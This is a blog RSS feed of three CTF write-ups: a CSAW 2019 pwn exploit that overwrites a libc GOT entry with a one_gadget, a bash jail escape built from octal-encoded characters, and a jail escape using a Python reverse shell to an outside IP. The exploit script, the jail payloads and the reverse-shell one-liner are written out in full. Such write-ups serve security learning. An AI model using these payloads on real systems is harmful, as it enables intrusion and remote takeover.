<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on philomath213</title><link>https://philomath213.github.io/post/</link><description>Recent content in Posts on philomath213</description><generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><lastBuildDate>Mon, 11 Nov 2019 14:47:14 +0100</lastBuildDate><atom:link href="https://philomath213.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>CSAW CTF Finals 2019 - defile</title><link>https://philomath213.github.io/post/csaw-ctf-finals-2019-defile/</link><pubDate>Mon, 11 Nov 2019 14:47:14 +0100</pubDate><guid>https://philomath213.github.io/post/csaw-ctf-finals-2019-defile/</guid><description>
&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Event&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Challenge&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Category&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Points&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;CSAW CTF Final 2019&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;defile&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;PWN&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;100&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;wild handlock main btw&lt;/p&gt;
&lt;p&gt;nc host port&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;attachments&#34;&gt;Attachments&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/osirislab/CSAW-CTF-2019-Finals/blob/master/pwn/defile/defile?raw=true&#34; target=&#34;_blank&#34;&gt;defile&lt;/a&gt;
&lt;a href=&#34;https://github.com/osirislab/CSAW-CTF-2019-Finals/raw/master/pwn/defile/libc.so.6&#34; target=&#34;_blank&#34;&gt;libc.so.6&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The binary is a dynamically linked ELF 64-bit executable, it has all protections enabled.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ file defile
defile: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5631f2588790fa344f6f360d39819963f4f66d7f, not stripped
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ checksec --file defile
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When running this binary, it will give you the address of &lt;code&gt;stdout&lt;/code&gt; in &lt;code&gt;libc&lt;/code&gt;, and ask for &lt;code&gt;How much do you want to write?&lt;/code&gt;, &lt;code&gt;Where do you want to write?&lt;/code&gt; and &lt;code&gt;What do you want to write?&lt;/code&gt;, then print &lt;code&gt;Bye!&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://philomath213.github.io/post/CSAW-CTF-Finals-2019-defile/screenshot0.png&#34; alt=&#34;screenshot0&#34; /&gt;&lt;/p&gt;
&lt;p&gt;So it looks like an intended vulnerability, we have an arbitrary write.&lt;/p&gt;
&lt;p&gt;After analyzing the binary, I found that the binary have two functions: &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;get_number&lt;/code&gt;, the &lt;code&gt;get_number&lt;/code&gt; function simply read an &lt;code&gt;unsigned long&lt;/code&gt; from &lt;code&gt;stdin&lt;/code&gt; and return it, while the &lt;code&gt;main&lt;/code&gt; function ask for the input size then check if the &lt;code&gt;size &amp;lt;= 256&lt;/code&gt; otherwise it will print &lt;code&gt;That&#39;s just too much&lt;/code&gt;, then it ask for the address where to write and finally read the input by calling &lt;code&gt;read&lt;/code&gt; function with the parameters &lt;code&gt;read(0, buf, nbytes)&lt;/code&gt;, where &lt;code&gt;buf&lt;/code&gt; is the address we provided and &lt;code&gt;nbytes&lt;/code&gt; the size of input.&lt;/p&gt;
&lt;p&gt;Since the binary is compiled with &lt;code&gt;full RELRO&lt;/code&gt; and &lt;code&gt;PIE&lt;/code&gt; enabled we can&amp;rsquo;t overwrite anything in the binary (e.g. &lt;code&gt;.got&lt;/code&gt;, &lt;code&gt;.dtors&lt;/code&gt;, &amp;hellip;) (as far as I know), so we need to find something else to overwrite, I noticed that there a call to &lt;code&gt;puts&lt;/code&gt; function after calling to &lt;code&gt;read&lt;/code&gt; function, So we need find some hooks or function pointers that &lt;code&gt;puts&lt;/code&gt; function use.&lt;/p&gt;
&lt;p&gt;To do that I just set a break point at &lt;code&gt;main+228&lt;/code&gt; where &lt;code&gt;main&lt;/code&gt; call &lt;code&gt;puts&lt;/code&gt; then step into puts functions.&lt;/p&gt;
&lt;p&gt;I noticed that &lt;code&gt;puts&lt;/code&gt; will call &lt;code&gt;__tunable_get_val@plt&lt;/code&gt; at &lt;code&gt;puts+13&lt;/code&gt;, make sure that you are debugging the target libc, not the local one.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;gef&amp;gt; set environment LD_PRELOAD ./libc.so.6
gef&amp;gt; b *main+228 b *main+228
Breakpoint 1 at 0xa19
gef&amp;gt; r
Starting program: /opt/ctf/defile
Here&#39;s stdout:
0x7fcd74c16760
How much do you want to write?
0
Where do you want to write?
0
What do you want to write?
...
...
gef&amp;gt; disas puts
Dump of assembler code for function puts:
0x00007fcd748aa9c0 &amp;lt;+0&amp;gt;: push r13
0x00007fcd748aa9c2 &amp;lt;+2&amp;gt;: push r12
0x00007fcd748aa9c4 &amp;lt;+4&amp;gt;: mov r12,rdi
0x00007fcd748aa9c7 &amp;lt;+7&amp;gt;: push rbp
0x00007fcd748aa9c8 &amp;lt;+8&amp;gt;: push rbx
0x00007fcd748aa9c9 &amp;lt;+9&amp;gt;: sub rsp,0x8
0x00007fcd748aa9cd &amp;lt;+13&amp;gt;: call 0x7fcd7484b100 &amp;lt;__tunable_get_val@plt+16&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since the libc is not compiled with &lt;code&gt;Full RELRO&lt;/code&gt;, we can overwrite &lt;code&gt;__tunable_get_val&lt;/code&gt; &lt;code&gt;.got&lt;/code&gt; entry&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ checksec --file libc.so.6
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In order to do that we need to calculate to offset between &lt;code&gt;stdout&lt;/code&gt; and &lt;code&gt;__tunable_get_val&lt;/code&gt; &lt;code&gt;.got&lt;/code&gt; entry, so step into &lt;code&gt;__tunable_get_val@plt+16&lt;/code&gt; and get the &lt;code&gt;.got&lt;/code&gt; entry address&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;...
...
gef&amp;gt; x/3i 0x7fcd7484b100
=&amp;gt; 0x7fcd7484b100 &amp;lt;__tunable_get_val@plt+16&amp;gt;: jmp QWORD PTR [rip+0x3c9fa2] # 0x7fcd74c150a8
0x7fcd7484b106 &amp;lt;__tunable_get_val@plt+22&amp;gt;: push 0x20
0x7fcd7484b10b &amp;lt;__tunable_get_val@plt+27&amp;gt;: jmp 0x7fcd7484afd0
...
...
gef&amp;gt; p 0x7fcd74c16760 - 0x7fcd74c150a8
$1 = 0x16b8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here the &lt;code&gt;stdout&lt;/code&gt; address is &lt;code&gt;0x7fcd74c16760&lt;/code&gt;, the &lt;code&gt;.got&lt;/code&gt; entry address is: &lt;code&gt;0x7fcd74c150a8&lt;/code&gt; and the offset is &lt;code&gt;0x16b8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now we can control &lt;code&gt;RIP&lt;/code&gt; register, but we have only one shot, we can&amp;rsquo;t do any ROP chaining, so we need to find &lt;code&gt;one_gadget&lt;/code&gt; RCE in that libc (see &lt;a href=&#34;https://github.com/david942j/one_gadget&#34; target=&#34;_blank&#34;&gt;one_gadget&lt;/a&gt;).&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ one_gadget libc.so.6
0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
constraints:
rcx == NULL
0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
constraints:
[rsp+0x40] == NULL
0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;exploit&#34;&gt;Exploit&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;get the &lt;code&gt;stdout&lt;/code&gt; address&lt;/li&gt;
&lt;li&gt;calculate the address of &lt;code&gt;__tunable_get_val&lt;/code&gt; got entry&lt;/li&gt;
&lt;li&gt;calculate the libc base address&lt;/li&gt;
&lt;li&gt;calculate the &lt;code&gt;one_gadget&lt;/code&gt; address&lt;/li&gt;
&lt;li&gt;overwrite the got entry with &lt;code&gt;one_gadget&lt;/code&gt; address.&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;exploit-code&#34;&gt;Exploit code&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import subprocess
from pwn import *
HOST = &amp;quot;pwn.chal.csaw.io&amp;quot;
PORT = 1004
def get_one_gadget(filename):
return list(map(
int,
subprocess.check_output([&#39;one_gadget&#39;, &#39;--raw&#39;, filename]).split(b&#39; &#39;)
))
def exploit():
offset = 0x16b8
libc = ELF(&amp;quot;./libc.so.6&amp;quot;)
stdout_libc = libc.sym[&amp;quot;_IO_2_1_stdout_&amp;quot;]
log.info(&amp;quot;stdout_libc: 0x%08x&amp;quot; % stdout_libc)
# one gadget RCE offsets
one_gadgets = get_one_gadget(&#39;./libc.so.6&#39;)
log.info(&amp;quot;one gadget RCE offsets: %s&amp;quot; % str(one_gadgets))
target = remote(HOST, PORT)
target.recvuntil(&amp;quot;Here&#39;s stdout:\n&amp;quot;)
buf = target.recvline().strip()
stdout = int(buf, 16)
log.info(&amp;quot;stdout: 0x%08x&amp;quot; % stdout)
libc_base = stdout - stdout_libc
log.info(&amp;quot;libc_base: 0x%08x&amp;quot; % libc_base)
got_entry = stdout - offset
one_gadget_libc = libc_base + one_gadgets[2]
log.info(&amp;quot;got_entry: 0x%08x&amp;quot; % got_entry)
log.info(&amp;quot;one_gadget: 0x%08x&amp;quot; % one_gadget_libc)
target.recvuntil(&amp;quot;do you want to write?\n&amp;quot;)
target.sendline(&#39;8&#39;)
target.recvuntil(&amp;quot;Where do you want to write?\n&amp;quot;)
target.send(str(got_entry))
target.recvuntil(&amp;quot;What do you want to write?\n&amp;quot;)
target.sendline(p64(one_gadget_libc))
target.sendline(&amp;quot;id;cat flag.txt;exit&amp;quot;)
buf = target.recvall()
if b&amp;quot;uid&amp;quot; in buf:
log.success(buf.decode())
else:
log.failure(buf.decode())
if __name__ == &amp;quot;__main__&amp;quot;:
exploit()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;running-the-exploit&#34;&gt;Running the exploit&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;python exploit_defile.py
[*] &#39;/home/philomath213/CSAW19_Finals/pwn/defile/libc.so.6&#39;
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
[*] stdout_libc: 0x003ec760
[*] one gadget RCE offsets: [324293, 324386, 1090444]
[+] Opening connection to pwn.chal.csaw.io on port 1004: Done
[*] stdout: 0x7f0fad3a8760
[*] libc_base: 0x7f0facfbc000
[*] got_entry: 0x7f0fad3a70a8
[*] one_gadget: 0x7f0fad0c638c
[+] Receiving all data: Done (88B)
[*] Closed connection to pwn.chal.csaw.io port 1004
[+] uid=1000(defile) gid=1000(defile) groups=1000(defile)
flag{me_you_in_room_1337_tonight}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;flag&#34;&gt;Flag&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{me_you_in_room_1337_tonight}&lt;/p&gt;
&lt;/blockquote&gt;</description></item><item><title>Securinets CTF Quals 2019 Special Revenge</title><link>https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/</link><pubDate>Mon, 25 Mar 2019 11:59:39 +0100</pubDate><guid>https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/</guid><description>
&lt;h1 id=&#34;securinets-ctf-quals-2019-special-revenge-writeup&#34;&gt;Securinets CTF Quals 2019 - Special Revenge WriteUp&lt;/h1&gt;
&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Event&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Challenge&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Category&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Points&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Solves&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Securinets CTF Quals 2019&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Special Revenge&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;PWN&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;1000&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;5&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;After the disappointment of last year challenge &amp;ldquo;special&amp;rdquo;, I came this year with a mystery revenge.&lt;/p&gt;
&lt;p&gt;ssh special@51.254.114.246&lt;/p&gt;
&lt;p&gt;password : b8f07e1000c719c6a7febde4ec0ab24d&lt;/p&gt;
&lt;p&gt;Author : Anis_Boss&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Another jail escape challenge, we were provided with ssh login (username special).&lt;/p&gt;
&lt;p&gt;After being logged in to the server we will get this welcome message, and a prompt where we can type our command.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;================================
Welcome to Special Revenge
================================
|| ||&amp;lt;(.)&amp;gt;||&amp;lt;(.)&amp;gt;|| ||
|| _|| || ||_ ||
|| (__D || C__) ||
|| (__D || C__) ||
|| (__D || C__) ||
|| (__D || C__) ||
|| || || || ||
================================
Securinets - Quals
================================
&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As expected we can execute the usual command in this very restricted shell (&lt;code&gt;ls&lt;/code&gt;, &lt;code&gt;cat&lt;/code&gt;, &lt;code&gt;id&lt;/code&gt;), also we didn&amp;rsquo;t get any error message by typing these commands.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; ls
&amp;gt;&amp;gt; id
&amp;gt;&amp;gt; cat /etc/passwd
&amp;gt;&amp;gt; echo helloooooo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I tried to escape this jail by sending interrupt signal (&lt;code&gt;CTRL+Z&lt;/code&gt;) since this a ssh session, and I got this message &lt;code&gt;&amp;quot;Hemm, nice one but you can&#39;t escape&amp;quot;&lt;/code&gt;, it seems that signal handler are altered by the jail script.&lt;/p&gt;
&lt;p&gt;Then I typed all alphanumeric characters to see if there any filters or a whitelist for words/characters, and got this very helpful error message.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
./mystery.sh: line 29: 1: command not found
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;which means that all the alphanumeric charset is filtered except &lt;code&gt;1&lt;/code&gt; (&lt;code&gt;1&lt;/code&gt;: command not found), and the jail script is executing the filter input at the end.&lt;/p&gt;
&lt;p&gt;I also did some tests to see if there are any allowed special characters, because with only &lt;code&gt;1&lt;/code&gt; there are no way to escape this jail, each time I put &lt;code&gt;1&lt;/code&gt; at the beginning and at the end and see what left between them.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; 1~`/;@#1
./mystery.sh: line 29: 1#1: command not found
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This means that &lt;code&gt;~`/;@&lt;/code&gt; are filtered while &lt;code&gt;#&lt;/code&gt; is allowed.&lt;/p&gt;
&lt;p&gt;After few attempts, I figure out that only these characters are allowed
&lt;code&gt;1&amp;lt;\&amp;quot;#$&#39;(){}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;So how can we escape this jail using just these 11 chars !!!!.&lt;/p&gt;
&lt;h3 id=&#34;objective&#34;&gt;Objective&lt;/h3&gt;
&lt;p&gt;Our objective is escaping this jail, How ??, by executing &lt;code&gt;/bin/sh&lt;/code&gt; or just &lt;code&gt;sh&lt;/code&gt; for short to spawn a shell, or by typing break to break the loop, &amp;hellip;&lt;/p&gt;
&lt;p&gt;the easiest one is spawning a shell by executing the &lt;code&gt;sh&lt;/code&gt; command, so we need to build the &lt;code&gt;sh&lt;/code&gt; string using the allowed characters.&lt;/p&gt;
&lt;h3 id=&#34;our-arsenal&#34;&gt;Our Arsenal&lt;/h3&gt;
&lt;p&gt;Despite the fact that all alphabetic are filtered, we have quit a few tricks at our disposal that we can use to build any command.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$# # number of arguments, evaluates as 0 in this case
$((expr)) # evaluate an arithmetic expression
$&#39;\116&#39; # convert octal to a character in string literal
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The 1st trick: &lt;code&gt;$#&lt;/code&gt; evaluates as &lt;code&gt;0&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; $#
./mystery.sh: line 29: 0: command not found
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So we have &lt;code&gt;1&lt;/code&gt; and &lt;code&gt;0&lt;/code&gt; in our hands, what come in my mind first was binary, since everything is built upon binary we can for sure build anything using these two lovely characters.&lt;/p&gt;
&lt;p&gt;The 2nd trick: &lt;code&gt;$((expr))&lt;/code&gt; will evaluate the arithmetic expression &lt;code&gt;expr&lt;/code&gt; and return the result.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#examples
$ echo $((1+1)) # addition
2
$ echo $((6-1)) # subtraction
5
$ echo $((2*3)) # multiplication
6
$ echo $((6/2)) # division
3
$ echo $((2&amp;lt;&amp;lt;4)) # shift left
32
$ echo $((32&amp;gt;&amp;gt;4)) # shift right
2
$ echo $((2#1010)) # convert binary value to decimal
10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The last one is what we need, but we don&amp;rsquo;t have the character &lt;code&gt;2&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Fortunately we can get &lt;code&gt;2&lt;/code&gt; just by shifting left &lt;code&gt;1&lt;/code&gt; by one bit&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ echo $((1&amp;lt;&amp;lt;1))
2
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# $((1&amp;lt;&amp;lt;1)) =&amp;gt; 2
# $# =&amp;gt; 0
# $(($((1&amp;lt;&amp;lt;1))#1$#1$#)) =&amp;gt; $((2#1010)) =&amp;gt; 10
echo $(($((1&amp;lt;&amp;lt;1))#1$#1$#))
10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The 3rd trick, &lt;code&gt;$&#39;\116&#39;&lt;/code&gt; convert the octal value &lt;code&gt;116&lt;/code&gt; to a character &lt;code&gt;N&lt;/code&gt; in string literal.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ echo $&#39;\163&#39;$&#39;\150&#39;
sh
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;remark&#34;&gt;Remark&lt;/h4&gt;
&lt;p&gt;I noticed that the input will be evaluate recursively twice, something like &lt;code&gt;eval(eval(INPUT))&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;When I run &lt;code&gt;\$\&#39;\\1$#1\&#39;&lt;/code&gt; in my bash I get this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ \$\&#39;\\1$#1\&#39;
bash: $&#39;\101&#39;: command not found
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;but when running the same input in the jail, I get this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; \$\&#39;\\1$#1\&#39;
/opt/mystery.sh: line 29: A: command not found
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;putting-the-pieces-together&#34;&gt;Putting the Pieces Together&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;\$\&#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#1$#$#$#11))\&#39;\$\&#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#$#1$#11$#))\&#39;
# 1st evaluation
=&amp;gt; \$\&#39;\\$((2#10100011))\&#39;\$\&#39;\\$((2#10010110))\&#39;
=&amp;gt; \$\&#39;\\163\&#39;\$\&#39;\\150\&#39;
=&amp;gt; $&#39;\163&#39;$&#39;\150&#39;
# 2nd evaluation
=&amp;gt; sh
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; \$\&#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#1$#$#$#11))\&#39;\$\&#39;\\$(($((1&amp;lt;&amp;lt;1))#1$#$#1$#11$#))\&#39;
$ id
uid=1015(special) gid=1015(special) groups=1015(special)
$ ls -la
total 28
dr-xr-xr-x 2 special special 4096 Mar 22 02:02 .
drwxr-xr-x 22 root root 4096 Mar 24 10:18 ..
-rw-r--r-- 1 special special 220 Sep 1 2015 .bash_logout
-rw-r--r-- 1 special special 3771 Sep 1 2015 .bashrc
-rw-r----- 1 root special 47 Mar 22 02:02 flag.txt
-rw-r-x--- 1 root special 752 Mar 22 01:55 mystery
-rw-r--r-- 1 special special 655 May 16 2017 .profile
$ cat flag.txt
securinets{bash_never_stop_from_being_awesome}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Jail challenges are always painful at the beginning, so they require more patient than usual challenges. A good understanding of the shell environment and built-ins can be handful in scenarios like this one.&lt;/p&gt;
&lt;p&gt;FLAG: &lt;code&gt;securinets{bash_never_stop_from_being_awesome}&lt;/code&gt;&lt;/p&gt;</description></item><item><title>Securinets CTF Quals 2019 Stone Mining</title><link>https://philomath213.github.io/post/securinets-ctf-quals-2019-stone-mining/</link><pubDate>Sun, 24 Mar 2019 19:00:46 +0100</pubDate><guid>https://philomath213.github.io/post/securinets-ctf-quals-2019-stone-mining/</guid><description>
&lt;h1 id=&#34;securinets-ctf-quals-2019-stone-mining-writeup&#34;&gt;Securinets CTF Quals 2019 - Stone Mining WriteUp&lt;/h1&gt;
&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Event&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Challenge&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Category&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Points&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Solves&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Securinets CTF Quals 2019&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Stone Mining&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;PWN&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;1000&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;4&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;I went inside a mine thinking it was safe, but got stuck. Help me out.&lt;/p&gt;
&lt;p&gt;Service is running at: nc 52.17.200.40 4000&lt;/p&gt;
&lt;p&gt;Author: bibiwars&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A jail escape challenge this time, with no prompt, probably a shell jail.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Jail - Stone Mining
Objective is to read &#39;flag&#39; file from the current directory
___________________________________________________________
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;we can start by executing some random commands:&lt;/p&gt;
&lt;p&gt;shell: id, echo foobar, whoami &amp;hellip;&lt;/p&gt;
&lt;p&gt;python: print(&amp;ldquo;foobar&amp;rdquo;), dir() &amp;hellip;&lt;/p&gt;
&lt;p&gt;&amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;id
Not today, some blacklisted caracter has been used
echo foobar
Not today, some blacklisted caracter has been used
print(&amp;quot;foboar&amp;quot;)
Not today, some blacklisted caracter has been used
dir()
Not today, some blacklisted caracter has been used
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We got only one message &amp;ldquo;Not today, some blacklisted caracter has been used&amp;rdquo;, which means that there are some blacklisted chars.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a
Not today, some blacklisted caracter has been used
b
Command executed :D
c
Not today, some blacklisted caracter has been used
d
Command executed :D
e
Command executed :D
f
Not today, some blacklisted caracter has been used
0
Not today, some blacklisted caracter has been used
1
Not today, some blacklisted caracter has been used
2
Not today, some blacklisted caracter has been used
3
Not today, some blacklisted caracter has been used
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As we can see, at least there some allowed chars.&lt;/p&gt;
&lt;p&gt;After some testing I found that these ascii lower case chars are allowed&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ertyuopdghbn
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There are other allowed chars, but I used only these char to escape the jail.&lt;/p&gt;
&lt;p&gt;So how can we bypass that ?&lt;/p&gt;
&lt;p&gt;I first noticed that we can use &amp;ldquo;python&amp;rdquo; word since all its chars are allowed.&lt;/p&gt;
&lt;p&gt;I made an attempt to print to stdout, but didn&amp;rsquo;t get any output&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nc 52.17.200.40 4000
Jail - Stone Mining
Objective is to read &#39;flag&#39; file from the current directory
___________________________________________________________
python
print(&#39;foobar&#39;)
exit()
^C
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So, I made an assumption that stdout, and stderr are closed, or filtered. Therefore, I attempt to connect to the outside using python sockets.&lt;/p&gt;
&lt;p&gt;I start a listener on my host and connect to it.&lt;/p&gt;
&lt;p&gt;Remote Host:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nc 52.17.200.40 4000
Jail - Stone Mining
Objective is to read &#39;flag&#39; file from the current directory
___________________________________________________________
python
import socket
s = socket.socket()
s.connect((&#39;41.102.162.29&#39;, 2130))
s.send(b&#39;test\n&#39;)
^C
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;My host:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -vvntlp 2130
Listening on any address 2130 (xds)
Connection from 41.102.162.29:39198
test
Total received bytes: 5
Total sent bytes: 0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So it works fine, after closing the connection (CTRL+C to close netcat).&lt;/p&gt;
&lt;h2 id=&#34;putting-the-pieces-together&#34;&gt;Putting the Pieces Together&lt;/h2&gt;
&lt;p&gt;The goal is getting reverse shell.&lt;/p&gt;
&lt;p&gt;First, Run the python interpreter.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then copy/past the payload there, the script won&amp;rsquo;t execute til the connection is closed, since we are using netcat we need to send interrupt signal CTRL+C to close the connection.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import subprocess
cmd = [&amp;quot;python&amp;quot;,&amp;quot;-c&amp;quot;,&#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&amp;quot;41.102.162.29&amp;quot;,2130)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;]
subprocess.Popen(cmd)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I used &amp;ldquo;subprocess.Popen&amp;rdquo; and run the &amp;ldquo;python -c&amp;rdquo;, to spawn a new background process, in order to avoid killing the process after closing the connection.
we won&amp;rsquo;t see any output in this jail, but you will get a reverser shell.&lt;/p&gt;
